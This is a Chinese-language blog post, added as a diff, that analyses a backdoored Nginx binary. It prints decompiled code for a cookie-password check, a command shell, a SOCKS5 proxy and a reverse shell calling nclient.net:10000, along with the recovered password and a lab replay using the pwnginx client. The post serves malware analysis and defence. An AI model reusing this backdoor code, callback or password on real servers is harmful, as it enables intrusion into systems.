@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+
+<meta name="description" content="We&#39;re Good People But Why Don&#39;t We Show It?">
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:domain" content="https://cssxn.github.io/">
+
+<meta name="twitter:image" content="https://cssxn.github.io/tn.png">
+<meta name="twitter:title" property="og:title" itemprop="title name" content="Call me Sam">
+<meta name="twitter:description" property="og:description" itemprop="description" content="We&#39;re Good People But Why Don&#39;t We Show It?">
+<meta name="og:type" content="website">
+<meta name="og:url" content="https://cssxn.github.io/">
+<meta name="og:image" itemprop="image primaryImageOfPage" content="https://cssxn.github.io/tn.png">
+
+<link rel="shortcut icon" href="https://cssxn.github.io/sam.ico" id="favicon">
+<link rel="stylesheet" href="https://cssxn.github.io/css/style.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Didact+Gothic">
+
+
+    
+
+    
+    
+    
+    <title>
+        
+        Nginx Backdoor Analysis
+        
+    </title>
+</head>
+
+<body>
+    <div class="wrap">
+        <div class="section" id="title">Nginx Backdoor Analysis</div>
+
+        
+<div class="section" id="content">
+    Fri Oct 19, 2018 &#183; 682 words
+    
+    <div class="tag-container">
+        
+        <span class="tag">
+            <a href="https://cssxn.github.io/tags/linux">
+                Linux
+            </a>
+        </span>
+        
+    </div>
+    
+    <hr/>
+    
+
+<h1 id="0-infected-nginx">0) Infected Nginx</h1>
+
+<p>使用IDA分析后，发现Nginx被嵌入了一个名为 <code>ngx_http_pwd_init</code>的lua模块</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ngx_int_t <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">ngx_http_pwd_init</span>(ngx_conf_t <span style="color:#f92672">*</span>cf_0)
+{
+  ngx_http_next_header_filter_11 <span style="color:#f92672">=</span> ngx_http_top_header_filter;
+  ngx_http_top_header_filter <span style="color:#f92672">=</span> ngx_http_pwd_header_filter;
+  ngx_http_next_body_filter_10 <span style="color:#f92672">=</span> ngx_http_top_body_filter;
+  ngx_http_top_body_filter <span style="color:#f92672">=</span> ngx_http_pwd_body_filter;
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+}</code></pre></div>
+<p>后门主要功能代码在 <code>ngx_http_pwd_header_filter</code> 函数中，该函数可以用来拦截所有的Nginx访问请求头，并对Request中的Cookie信息来验证后门连接密码，以及要执行的功能。</p>
+
+<p>经分析发现该后门主要有3种功能：</p>
+
+<ul>
+<li>1.Shell Execute</li>
+<li>2.Socks5 Proxy</li>
+<li>3.Reverse Shell</li>
+</ul>
+
+<h1 id="1-execute-shell-command">1) Execute shell command</h1>
+
+<p>下面截取了一部分的代码，可以发现，通过匹配Cookie中的<code>worderx</code>字段来验证连接后门的密码，<code>typefp</code>字段作为功能的编号，1号是命令执行，最后调用<code>exec_shell(cmd_fd)</code>来返回一个简单的交互式Shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ( request<span style="color:#f92672">-&gt;</span>headers_in.cookies.nelts <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
+  {
+    v5 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_BYTE <span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)request<span style="color:#f92672">-&gt;</span>headers_in.cookies.elts <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20LL</span>);
+    v6 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_BYTE <span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)request<span style="color:#f92672">-&gt;</span>headers_in.cookies.elts <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20LL</span>);
+    v7 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;worderx=Bo9vrZ6TKBmq; typefp=1&#34;</span>;  <span style="color:#75715e">// Match the password, and
+</span><span style="color:#75715e"></span>    v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">30LL</span>;
+    <span style="color:#66d9ef">do</span>
+    {
+      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v8 )
+        <span style="color:#66d9ef">break</span>;
+      v3 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>v6 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)<span style="color:#f92672">*</span>v7;
+      v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>v6<span style="color:#f92672">++</span> <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>v7<span style="color:#f92672">++</span>;
+      <span style="color:#f92672">--</span>v8;
+    }
+    <span style="color:#66d9ef">while</span> ( v4 );
+    v9 <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>v3 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>v4;
+    v10 <span style="color:#f92672">=</span> v3;
+    v11 <span style="color:#f92672">=</span> v9 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)v3;
+    v12 <span style="color:#f92672">=</span> v9 <span style="color:#f92672">==</span> v10;
+    <span style="color:#66d9ef">if</span> ( v9 <span style="color:#f92672">==</span> v10 )
+    {
+      msend(cmd_fd, <span style="color:#e6db74">&#34;worderx1&#34;</span>, <span style="color:#ae81ff">9</span>);
+      exec_shell(cmd_fd);
+    }</code></pre></div>
+<p>exec_shell函数：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">exec_shell</span>(<span style="color:#66d9ef">int</span> fd)
+{
+  <span style="color:#66d9ef">if</span> ( fork() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+  {
+    close(fd);
+    exit(<span style="color:#ae81ff">0</span>);
+  }
+  dup2(fd, STDIN_FILENO);
+  dup2(fd, STDOUT_FILENO);
+  dup2(fd, STDERR_FILENO);
+  execl(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-sh&#34;</span>, <span style="color:#ae81ff">0LL</span>);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></div>
+<h1 id="2-socks5-proxy">2) Socks5 Proxy</h1>
+
+<p>第二个功能是socks5代理，匹配功能编号成功后，调用<code>exec_socks5(cmd_fd)</code>进入设置代理函数</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    {
+      v13 <span style="color:#f92672">=</span> v5;
+      v14 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;worderx=Bo9vrZ6TKBmq; typefp=2&#34;</span>; 
+      v15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">30LL</span>;
+      <span style="color:#66d9ef">do</span>
+      {
+        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v15 )
+          <span style="color:#66d9ef">break</span>;
+        v11 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>v13 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)<span style="color:#f92672">*</span>v14;
+        v12 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>v13<span style="color:#f92672">++</span> <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>v14<span style="color:#f92672">++</span>;
+        <span style="color:#f92672">--</span>v15;
+      }
+      <span style="color:#66d9ef">while</span> ( v12 );
+      v16 <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>v11 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>v12;
+      v17 <span style="color:#f92672">=</span> v11;
+      v18 <span style="color:#f92672">=</span> v16 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)v11;
+      v19 <span style="color:#f92672">=</span> v16 <span style="color:#f92672">==</span> v17;
+      <span style="color:#66d9ef">if</span> ( v16 <span style="color:#f92672">==</span> v17 )
+      {
+        msend(cmd_fd, <span style="color:#e6db74">&#34;worderx2&#34;</span>, <span style="color:#ae81ff">9</span>);
+        exec_socks5(cmd_fd);
+      }</code></pre></div>
+<p>exec_socks5 设置代理函数中创建了一个子进程，随后进入worker函数中去执设置</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">exec_socks5</span>(<span style="color:#66d9ef">int</span> fd)
+{
+  <span style="color:#66d9ef">if</span> ( fork() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+  {
+    close(fd);
+    exit(<span style="color:#ae81ff">0</span>);
+  }
+  fcntl(fd, F_GETFL, <span style="color:#ae81ff">0LL</span>);
+  fcntl(fd, F_SETFL);
+  worker(fd);
+  exit(<span style="color:#ae81ff">0</span>);
+}</code></pre></div>
+<p>worker函数中根据接收到的域名和端口来创建一个新的udp会话，会后进入forwarder函数开始转发数据</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">  puts(<span style="color:#e6db74">&#34;Recving request...&#34;</span>);
+  v6 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)recv(csock, buffer, <span style="color:#ae81ff">0x2000uLL</span>, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">// 接收数据
+</span><span style="color:#75715e"></span>  printf(<span style="color:#e6db74">&#34;Recved %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v6);
+  __x <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+  <span style="color:#66d9ef">if</span> ( buffer[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> )
+  {
+    memset(domain, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(domain));
+    v7 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)buffer[<span style="color:#ae81ff">4</span>];
+    strncpy(domain, <span style="color:#f92672">&amp;</span>buffer[<span style="color:#ae81ff">5</span>], v7); <span style="color:#75715e">// 从数据中提取域名
+</span><span style="color:#75715e"></span>    v8 <span style="color:#f92672">=</span> gethostbyname(domain);
+    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v8 )
+    {
+      printf(<span style="color:#e6db74">&#34;Cannot Resolv the Domain name:%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, domain);
+      close(csock);
+      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+    memcpy(<span style="color:#f92672">&amp;</span>dest, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)v8<span style="color:#f92672">-&gt;</span>h_addr_list, v8<span style="color:#f92672">-&gt;</span>h_length);
+    v20 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_WORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buffer[v7 <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>];
+  }
+    <span style="color:#75715e">// 中间忽略部分代码
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ( buffer[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span> )
+  {
+    puts(<span style="color:#e6db74">&#34;Hey, its a udp request!&#34;</span>);
+    sock_fd <span style="color:#f92672">=</span> socket(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">//创建UDP链接
+</span><span style="color:#75715e"></span>  }
+  <span style="color:#66d9ef">else</span>
+  {
+    sock_fd <span style="color:#f92672">=</span> socket(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+  }
+    <span style="color:#75715e">// 中间忽略部分代码
+</span><span style="color:#75715e"></span>    forwarder(csock, sock_fd); <span style="color:#75715e">// 进入转发函数
+</span><span style="color:#75715e"></span>    printf(aWorker, sock_fd);
+    close(csock);
+    close(sock_fd);</code></pre></div>
+<p>forworder函数部分代码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+  {
+    memset(<span style="color:#f92672">&amp;</span>rfds, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(rfds));
+    rfds.fds_bits[v4] <span style="color:#f92672">|=</span> v5;
+    rfds.fds_bits[v7] <span style="color:#f92672">|=</span> <span style="color:#ae81ff">1LL</span> <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#66d9ef">char</span>)to <span style="color:#f92672">%</span> <span style="color:#ae81ff">64</span>;
+    v8 <span style="color:#f92672">=</span> v2;
+    <span style="color:#66d9ef">if</span> ( to <span style="color:#f92672">&gt;=</span> v2 )
+      v8 <span style="color:#f92672">=</span> to;
+    <span style="color:#66d9ef">if</span> ( select(v8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>rfds, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>) )
+    {
+      v9 <span style="color:#f92672">=</span> rfds.fds_bits[v4];
+      <span style="color:#66d9ef">if</span> ( _bittest64(<span style="color:#f92672">&amp;</span>v9, v14) )
+      {
+        v10 <span style="color:#f92672">=</span> recv(v2, buffer, <span style="color:#ae81ff">0x2000uLL</span>, <span style="color:#ae81ff">0</span>);
+        <span style="color:#66d9ef">if</span> ( v10 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> msend(to, buffer, v10) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> )
+          <span style="color:#66d9ef">break</span>;
+      }
+      v11 <span style="color:#f92672">=</span> rfds.fds_bits[v7];
+      <span style="color:#66d9ef">if</span> ( _bittest64(<span style="color:#f92672">&amp;</span>v11, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(to <span style="color:#f92672">%</span> <span style="color:#ae81ff">64</span>)) )
+      {
+        v12 <span style="color:#f92672">=</span> recv(to, buffer, <span style="color:#ae81ff">0x2000uLL</span>, <span style="color:#ae81ff">0</span>);
+        <span style="color:#66d9ef">if</span> ( v12 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> msend(v2, buffer, v12) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> )
+          <span style="color:#66d9ef">break</span>;
+      }
+    }
+  }</code></pre></div>
+<h1 id="3-reverse-shell">3) Reverse Shell</h1>
+
+<p>最后一个功能是反弹shell到一个指定域名<code>nclient.net</code>，端口<code>10000</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">v20 <span style="color:#f92672">=</span> v5;
+v21 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;worderx=Bo9vrZ6TKBmq; typefp=3&#34;</span>;
+v22 <span style="color:#f92672">=</span> <span style="color:#ae81ff">30LL</span>;
+<span style="color:#66d9ef">do</span>
+{
+    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v22 )
+        <span style="color:#66d9ef">break</span>;
+    v18 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>v20 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)<span style="color:#f92672">*</span>v21;
+    v19 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>v20<span style="color:#f92672">++</span> <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>v21<span style="color:#f92672">++</span>;
+    <span style="color:#f92672">--</span>v22;
+}<span style="color:#66d9ef">while</span> ( v19 );
+<span style="color:#66d9ef">if</span> ( (<span style="color:#f92672">!</span>v18 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>v19) <span style="color:#f92672">==</span> v18 )
+   re_shell(<span style="color:#e6db74">&#34;nclient.net&#34;</span>, <span style="color:#ae81ff">10000</span>);</code></pre></div>
+<p>re_shell函数</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">re_shell</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>host, <span style="color:#66d9ef">int</span> port)
+{
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v2; <span style="color:#75715e">// rbp
+</span><span style="color:#75715e"></span>  __pid_t v3; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> sock_fd; <span style="color:#75715e">// ebx
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> hostent <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// rax
+</span><span style="color:#75715e"></span>  sockaddr_in server; <span style="color:#75715e">// [rsp+0h] [rbp-38h]
+</span><span style="color:#75715e"></span>  in_addr addr; <span style="color:#75715e">// [rsp+10h] [rbp-28h]
+</span><span style="color:#75715e"></span>
+  v2 <span style="color:#f92672">=</span> host;
+  v3 <span style="color:#f92672">=</span> fork();
+  <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v3 )
+  {
+    setsid();
+    sock_fd <span style="color:#f92672">=</span> socket(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">if</span> ( sock_fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+      exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+    server.sin_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+    server.sin_port <span style="color:#f92672">=</span> __ROR2__(port, <span style="color:#ae81ff">8</span>);
+    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>inet_pton(<span style="color:#ae81ff">2</span>, host, <span style="color:#f92672">&amp;</span>addr) )
+    {
+      v5 <span style="color:#f92672">=</span> gethostbyname(host);
+      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v5 )
+        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+      v2 <span style="color:#f92672">=</span> inet_ntoa((<span style="color:#66d9ef">struct</span> in_addr)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">struct</span> in_addr <span style="color:#f92672">**</span>)v5<span style="color:#f92672">-&gt;</span>h_addr_list)<span style="color:#f92672">-&gt;</span>s_addr);
+    }
+    server.sin_addr.s_addr <span style="color:#f92672">=</span> inet_addr(v2);
+    <span style="color:#66d9ef">if</span> ( connect(sock_fd, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server, <span style="color:#ae81ff">0x10u</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+      exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+    dup2(sock_fd, STDIN_FILENO);
+    dup2(sock_fd, STDOUT_FILENO);
+    dup2(sock_fd, STDERR_FILENO);
+    close(sock_fd);
+    execl(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server.sin_family);
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></div>
+<h1 id="3-traceing-replay">3) Traceing &amp; Replay</h1>
+
+<p>后来发现该后门是使用的github上开源项目<code>pwnginx</code>经过二次开发后的版本，并且修改了用于来连接和校验的cookie中使用的字段名称，以及增加了第三个后门功能，反弹shell到指定域名。</p>
+
+<p>为了复现攻击环境，在虚拟机中使用CentOS7安装了同版本的Nginx，并把主程序替换成被感染的Nginx样本，并启动Nginx服务。</p>
+
+<p>用另一台Ubuntu虚拟机下载<code>pwnginx</code>项目源码后，修正验证密码以及执行功能的匹配字段名，编译客户端，并使分析得到的后门密码<code>Bo9vrZ6TKBmq</code>尝试连接该后门</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-BASH" data-lang="BASH">root@ubuntu:./pwnginx shell <span style="color:#ae81ff">192</span>.168.89.139 <span style="color:#ae81ff">80</span> Bo9vrZ6TKBmq</code></pre></div>
+<p>执行结果，成功返回一个交互环境！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-BASH" data-lang="BASH"><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Obtaining shell access
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> About to connect to nginx
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Enjoy the real world.
+id
+uid<span style="color:#f92672">=</span><span style="color:#ae81ff">992</span><span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span><span style="color:#ae81ff">990</span><span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span><span style="color:#ae81ff">990</span><span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>system_u:system_r:initrc_t:s0</code></pre></div>
+<h1 id="4-references">4) References</h1>
+
+<ul>
+<li><a href="https://github.com/t57root/pwnginx">pwnginx Nginx后门</a></li>
+<li><a href="https://github.com/t57root/amcsh">amcsh</a></li>
+<li><a href="https://github.com/t57root/remote-admin-tools/tree/master/mysql_audit_plugin">mysql_audit_plugin</a></li>
+<li><a href="https://github.com/phith0n/arbitrary-php-extension">arbitrary-php-extension</a></li>
+<li><a href="https://www.youtube.com/watch?v=E1_uuFWibuM">Makefile的写法</a></li>
+</ul>
+
+</div>
+
+
+        
+<div class="section bottom-menu">
+    
+<hr />
+<p>
+
+
+    
+        <a href="/posts">back</a>
+        
+            &#183;
+        
+    
+
+    
+        
+            <a href="/posts">
+                Posts
+            </a>
+        
+    
+    
+        
+            &#183; 
+            <a href="/gallery">
+                Gallery
+            </a>
+        
+            &#183; 
+            <a href="/about">
+                Who am I?
+            </a>
+        
+    
+    &#183; 
+    <a href="https://cssxn.github.io/">
+        main
+    </a>
+
+</p>
+</div>
+
+
+        <div class="section footer">I&rsquo;m not a little Froend-End.</div>
+    </div>
+</body>
+
+</html>
